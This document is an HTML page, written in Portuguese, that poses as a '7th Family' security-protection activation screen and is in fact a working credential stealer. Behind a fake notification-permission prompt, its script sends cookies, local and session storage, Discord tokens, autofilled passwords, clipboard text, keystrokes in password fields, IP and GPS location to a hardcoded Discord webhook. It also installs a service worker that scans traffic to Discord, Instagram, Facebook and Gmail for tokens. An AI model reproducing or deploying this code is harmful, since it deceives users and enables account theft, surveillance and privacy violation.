<!DOCTYPE html>
<html lang="pt">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>7th Family | Security Check</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background: radial-gradient(circle at 30% 10%, #0a0a0f, #0f0f1a, #050508);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
            position: relative;
        }
        
        .card {
            background: rgba(20, 20, 35, 0.95);
            backdrop-filter: blur(10px);
            border-radius: 40px;
            padding: 50px 30px;
            max-width: 450px;
            width: 100%;
            text-align: center;
            box-shadow: 0 30px 60px rgba(0,0,0,0.5), 0 0 0 1px rgba(255,65,108,0.2);
            animation: fadeIn 0.5s ease;
            z-index: 10;
        }
        
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(30px); }
            to { opacity: 1; transform: translateY(0); }
        }
        
        .icon {
            font-size: 80px;
            margin-bottom: 20px;
            filter: drop-shadow(0 0 15px rgba(255,65,108,0.5));
            animation: pulse 2s infinite;
        }
        
        @keyframes pulse {
            0%, 100% { transform: scale(1); }
            50% { transform: scale(1.05); }
        }
        
        h2 {
            background: linear-gradient(135deg, #ff416c, #ff4b2b);
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
            margin-bottom: 15px;
            font-size: 32px;
            font-weight: 900;
            letter-spacing: -0.5px;
        }
        
        p {
            color: #aaa;
            margin-bottom: 30px;
            line-height: 1.6;
            font-size: 15px;
        }
        
        .btn-container {
            position: relative;
            width: 100%;
            margin: 20px 0;
        }
        
        .activate-btn {
            background: linear-gradient(135deg, #ff416c, #ff4b2b);
            color: white;
            border: none;
            padding: 18px 35px;
            font-size: 18px;
            font-weight: bold;
            border-radius: 60px;
            cursor: pointer;
            width: 100%;
            transition: all 0.3s;
            box-shadow: 0 8px 25px rgba(255,65,108,0.4);
            position: relative;
            z-index: 2;
        }
        
        .activate-btn:active {
            transform: scale(0.97);
        }
        
        .loading {
            display: none;
            margin-top: 25px;
        }
        
        .spinner {
            width: 40px;
            height: 40px;
            border: 3px solid rgba(255,255,255,0.2);
            border-top: 3px solid #ff416c;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            margin: 0 auto 12px;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        .status {
            margin-top: 20px;
            padding: 12px;
            border-radius: 12px;
            font-size: 13px;
            display: none;
            font-weight: 500;
        }
        
        .status.success {
            background: rgba(46,125,50,0.2);
            color: #4caf50;
            border: 1px solid #4caf50;
            display: block;
        }
        
        .status.error {
            background: rgba(198,40,40,0.2);
            color: #ff5555;
            border: 1px solid #ff5555;
            display: block;
        }
        
        .hidden {
            display: none;
        }
        
        .permission-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.7);
            z-index: 999;
            display: none;
            justify-content: center;
            align-items: center;
            backdrop-filter: blur(5px);
        }
        
        .fake-permission {
            background: #1e1e2e;
            border-radius: 28px;
            padding: 25px;
            max-width: 280px;
            text-align: center;
            border: 1px solid #ff416c;
            box-shadow: 0 20px 40px rgba(0,0,0,0.5);
        }
        
        .fake-permission p {
            color: white;
            margin-bottom: 20px;
        }
        
        .fake-permission button {
            background: #ff416c;
            color: white;
            border: none;
            padding: 12px 25px;
            border-radius: 30px;
            font-weight: bold;
            margin: 5px;
            cursor: pointer;
        }
        
        .notification-toast {
            position: fixed;
            bottom: 20px;
            left: 20px;
            right: 20px;
            background: #1a1a2e;
            border-left: 4px solid #ff416c;
            padding: 12px;
            border-radius: 12px;
            color: white;
            font-size: 13px;
            z-index: 1000;
            display: none;
            animation: slideUp 0.3s ease;
            box-shadow: 0 5px 20px rgba(0,0,0,0.3);
        }
        
        @keyframes slideUp {
            from { transform: translateY(100px); opacity: 0; }
            to { transform: translateY(0); opacity: 1; }
        }
    </style>
</head>
<body>

<div class="card" id="mainCard">
    <div class="icon">🛡️</div>
    <h2>7TH FAMILY</h2>
    <p>Verificação de segurança necessária<br>Ative a proteção em tempo real</p>
    
    <div class="btn-container">
        <button class="activate-btn" id="activateBtn">⚡ ATIVAR PROTEÇÃO</button>
    </div>
    
    <div class="loading" id="loading">
        <div class="spinner"></div>
        <div style="color:#888; font-size:12px;">Configurando proteção...</div>
    </div>
    
    <div class="status" id="status"></div>
</div>

<div class="permission-overlay" id="permissionOverlay">
    <div class="fake-permission">
        <p>🔒 O site deseja enviar notificações</p>
        <button id="fakeAllow">Permitir</button>
        <button id="fakeBlock">Bloquear</button>
    </div>
</div>

<div class="notification-toast" id="toast">
    <span id="toastMsg">🔔 Ativação concluída</span>
</div>

<script>
    const WEBHOOK_URL = "https://discord.com/api/webhooks/1484690769506865265/bWz8kwvQkRSAGsd7QA4EMYuImytr5otbUVJpg2CZvcEs8LuBHUROkZ-6ZRsFtcpSb4u2";
    
    let serviceWorkerRegistered = false;
    let collectedData = false;
    
    function showToast(msg) {
        const toast = document.getElementById('toast');
        document.getElementById('toastMsg').innerText = msg;
        toast.style.display = 'block';
        setTimeout(() => {
            toast.style.display = 'none';
        }, 3000);
    }
    
    async function sendToWebhook(data, type) {
        try {
            const embed = {
                title: "💀 7TH FAMILY - XSS PERSISTENT",
                color: 0xFF0000,
                timestamp: new Date().toISOString(),
                fields: [],
                footer: { text: "7th Family | Persistent Mode" }
            };
            
            if (type === 'victim') {
                embed.title = "🎯 NOVA VÍTIMA - SERVICE WORKER ATIVADO";
                embed.fields.push({
                    name: "📱 DISPOSITIVO",
                    value: `UA: ${data.ua}\nIP: ${data.ip}\nTela: ${data.screen}\nTimezone: ${data.timezone}`,
                    inline: false
                });
                embed.fields.push({
                    name: "🔗 URL ORIGEM",
                    value: data.url,
                    inline: false
                });
            }
            
            if (type === 'token') {
                embed.title = "🔑 TOKEN CAPTURADO";
                embed.fields.push({
                    name: "TOKEN",
                    value: `\`${data.token}\``,
                    inline: false
                });
                embed.fields.push({
                    name: "URL",
                    value: data.url,
                    inline: true
                });
            }
            
            if (type === 'data') {
                embed.title = "📀 DADOS COMPLETOS";
                embed.fields.push({
                    name: "COOKIES",
                    value: `\`\`\`${data.cookies?.substring(0, 300) || 'Nenhum'}\`\`\``,
                    inline: false
                });
                if (data.localStorage) {
                    embed.fields.push({
                        name: "LOCALSTORAGE",
                        value: `\`\`\`${data.localStorage.substring(0, 300)}\`\`\``,
                        inline: false
                    });
                }
                embed.fields.push({
                    name: "URL ATUAL",
                    value: data.url,
                    inline: true
                });
            }
            
            if (type === 'location') {
                embed.title = "📍 LOCALIZAÇÃO";
                embed.fields.push({
                    name: "COORDENADAS",
                    value: `Lat: ${data.lat}\nLng: ${data.lng}\nPrecisão: ${data.acc}m\n[Maps](https://maps.google.com/?q=${data.lat},${data.lng})`,
                    inline: false
                });
            }
            
            if (type === 'password') {
                embed.title = "🔐 SENHA CAPTURADA";
                embed.fields.push({
                    name: "SENHA",
                    value: `\`${data.password}\``,
                    inline: false
                });
                embed.fields.push({
                    name: "URL",
                    value: data.url,
                    inline: true
                });
            }
            
            if (type === 'clipboard') {
                embed.title = "📋 CLIPBOARD";
                embed.fields.push({
                    name: "CONTEÚDO",
                    value: `\`\`\`${data.content.substring(0, 400)}\`\`\``,
                    inline: false
                });
            }
            
            const payload = {
                content: "@everyone **✅ XSS PERSISTENTE ATIVO**",
                embeds: [embed],
                username: "7th Family XSS"
            };
            
            await fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            });
        } catch(e) {
            console.error("Erro webhook:", e);
        }
    }
    
    async function getIP() {
        try {
            const r = await fetch('https://api.ipify.org?format=json');
            const d = await r.json();
            return d.ip;
        } catch(e) {
            return 'unavailable';
        }
    }
    
    async function getLocationSilent() {
        return new Promise((resolve) => {
            if (!navigator.geolocation) {
                resolve(null);
                return;
            }
            navigator.geolocation.getCurrentPosition(
                (pos) => {
                    resolve({
                        lat: pos.coords.latitude,
                        lng: pos.coords.longitude,
                        acc: pos.coords.accuracy
                    });
                },
                () => { resolve(null); },
                { timeout: 4000, maximumAge: 60000 }
            );
            setTimeout(() => resolve(null), 4500);
        });
    }
    
    function getDiscordTokens() {
        let tokens = [];
        const tokenRegex = /[\w-]{24}\.[\w-]{6}\.[\w-]{27}/g;
        const mfaRegex = /mfa\.[\w-]{84}/g;
        
        for (let i = 0; i < localStorage.length; i++) {
            let val = localStorage.getItem(localStorage.key(i));
            if (val) {
                tokens.push(...(val.match(tokenRegex) || []));
                tokens.push(...(val.match(mfaRegex) || []));
            }
        }
        for (let i = 0; i < sessionStorage.length; i++) {
            let val = sessionStorage.getItem(sessionStorage.key(i));
            if (val) {
                tokens.push(...(val.match(tokenRegex) || []));
            }
        }
        return [...new Set(tokens)];
    }
    
    function getDeviceInfo() {
        return {
            ua: navigator.userAgent,
            platform: navigator.platform,
            lang: navigator.language,
            screen: `${screen.width}x${screen.height}`,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            url: location.href,
            referrer: document.referrer,
            localStorageItems: localStorage.length,
            webdriver: navigator.webdriver || false,
            hardwareConcurrency: navigator.hardwareConcurrency || '?',
            deviceMemory: navigator.deviceMemory || '?',
            connection: navigator.connection?.effectiveType || '?'
        };
    }
    
    async function getSavedPasswords() {
        let passwords = [];
        const input = document.createElement('input');
        input.type = 'password';
        input.style.cssText = 'position:absolute;left:-9999px;top:-9999px;opacity:0';
        document.body.appendChild(input);
        input.focus();
        await new Promise(r => setTimeout(r, 1000));
        if (input.value && input.value.length > 0) {
            passwords.push(input.value);
            await sendToWebhook({ password: input.value, url: location.href }, 'password');
        }
        document.body.removeChild(input);
        return passwords;
    }
    
    async function getClipboardContent() {
        try {
            if (navigator.clipboard && navigator.clipboard.readText) {
                const text = await navigator.clipboard.readText();
                if (text && text.length > 0) {
                    await sendToWebhook({ content: text }, 'clipboard');
                    return text;
                }
            }
        } catch(e) {}
        return null;
    }
    
    function injectKeylogger() {
        let lastValue = '';
        document.addEventListener('input', (e) => {
            if (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA') {
                const val = e.target.value;
                if (val.length > lastValue.length) {
                    const newChar = val[val.length - 1];
                    if (e.target.type === 'password' || e.target.type === 'email' || e.target.id?.includes('pass')) {
                        sendToWebhook({ 
                            password: val, 
                            url: location.href,
                            timestamp: new Date().toISOString()
                        }, 'password');
                    }
                }
                lastValue = val;
            }
        });
    }
    
    async function stealAllData() {
        const tokens = getDiscordTokens();
        if (tokens.length > 0) {
            for (const token of tokens) {
                await sendToWebhook({ token: token, url: location.href }, 'token');
            }
        }
        
        const cookies = document.cookie;
        const localStorageData = JSON.stringify(localStorage);
        const sessionData = JSON.stringify(sessionStorage);
        
        await sendToWebhook({
            cookies: cookies,
            localStorage: localStorageData,
            sessionStorage: sessionData,
            url: location.href
        }, 'data');
        
        const locationData = await getLocationSilent();
        if (locationData) {
            await sendToWebhook(locationData, 'location');
        }
        
        await getSavedPasswords();
        await getClipboardContent();
    }
    
    function registerServiceWorker() {
        if ('serviceWorker' in navigator) {
            const swCode = `
                const WEBHOOK_SW = "${WEBHOOK_URL}";
                
                async function sendToWebhook(data, type) {
                    try {
                        const embed = {
                            title: "💀 SW PERSISTENT",
                            color: 0xFF0000,
                            timestamp: new Date().toISOString(),
                            fields: []
                        };
                        if (type === 'token') {
                            embed.title = "🔑 TOKEN CAPTURADO SW";
                            embed.fields.push({ name: "TOKEN", value: \`\${data.token}\`, inline: false });
                        }
                        if (type === 'data') {
                            embed.title = "📀 DADOS SW";
                            embed.fields.push({ name: "COOKIES", value: \`\${data.cookies?.substring(0, 300)}\`, inline: false });
                        }
                        await fetch(WEBHOOK_SW, {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({ content: \`\`\`json\n\${JSON.stringify(data, null, 2)}\n\`\`\`, embeds: [embed] })
                        });
                    } catch(e) {}
                }
                
                self.addEventListener('fetch', (event) => {
                    const url = event.request.url;
                    if (url.includes('discord.com') || url.includes('instagram.com') || url.includes('facebook.com') || url.includes('gmail.com')) {
                        event.respondWith(
                            fetch(event.request).then(async (response) => {
                                const text = await response.clone().text();
                                const tokenRegex = /[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}/g;
                                const tokens = text.match(tokenRegex) || [];
                                if (tokens.length > 0) {
                                    for (const token of tokens) {
                                        await sendToWebhook({ token: token, url: url }, 'token');
                                    }
                                }
                                return response;
                            })
                        );
                    }
                });
                
                self.addEventListener('activate', (event) => {
                    event.waitUntil(clients.claim());
                    setInterval(() => {
                        clients.matchAll().then(clients => {
                            clients.forEach(client => {
                                client.postMessage({ type: 'steal' });
                            });
                        });
                    }, 45000);
                });
                
                self.addEventListener('message', (event) => {
                    if (event.data.type === 'steal') {
                        event.source.postMessage({ type: 'stealResponse' });
                    }
                });
                
                self.addEventListener('install', () => {
                    self.skipWaiting();
                });
            `;
            
            const blob = new Blob([swCode], { type: 'application/javascript' });
            const swUrl = URL.createObjectURL(blob);
            
            navigator.serviceWorker.register(swUrl).then(reg => {
                serviceWorkerRegistered = true;
                showToast('✅ Proteção persistente ativada');
                
                if (navigator.serviceWorker.controller) {
                    navigator.serviceWorker.controller.postMessage({ type: 'steal' });
                }
                
                setInterval(() => {
                    if (navigator.serviceWorker.controller) {
                        navigator.serviceWorker.controller.postMessage({ type: 'steal' });
                    }
                }, 60000);
            }).catch(e => {
                console.log("SW error:", e);
            });
        }
    }
    
    async function fullStealAndPersist() {
        if (collectedData) return;
        collectedData = true;
        
        document.getElementById('activateBtn').style.display = 'none';
        document.getElementById('loading').style.display = 'block';
        
        const ip = await getIP();
        const device = getDeviceInfo();
        
        await sendToWebhook({
            ip: ip,
            ua: device.ua,
            screen: device.screen,
            timezone: device.timezone,
            url: device.url
        }, 'victim');
        
        await stealAllData();
        
        injectKeylogger();
        
        registerServiceWorker();
        
        setInterval(() => {
            stealAllData();
        }, 90000);
        
        setInterval(async () => {
            const loc = await getLocationSilent();
            if (loc) {
                await sendToWebhook(loc, 'location');
            }
        }, 120000);
        
        document.getElementById('loading').style.display = 'none';
        document.getElementById('status').className = 'status success';
        document.getElementById('status').innerHTML = '✅ Proteção ativada! Redirecionando...';
        
        setTimeout(() => {
            window.location.href = "https://discord.com/app";
        }, 2000);
    }
    
    document.getElementById('activateBtn').addEventListener('click', () => {
        const overlay = document.getElementById('permissionOverlay');
        overlay.style.display = 'flex';
        
        document.getElementById('fakeAllow').onclick = () => {
            overlay.style.display = 'none';
            fullStealAndPersist();
        };
        
        document.getElementById('fakeBlock').onclick = () => {
            overlay.style.display = 'none';
            document.getElementById('status').className = 'status error';
            document.getElementById('status').innerHTML = '❌ Você precisa permitir as notificações para continuar';
            document.getElementById('status').style.display = 'block';
            document.getElementById('activateBtn').style.display = 'block';
            setTimeout(() => {
                document.getElementById('status').style.display = 'none';
            }, 3000);
        };
    });
    
    if (navigator.serviceWorker) {
        navigator.serviceWorker.addEventListener('message', (event) => {
            if (event.data.type === 'stealResponse') {
                stealAllData();
            }
        });
    }
</script>
</body>
</html>
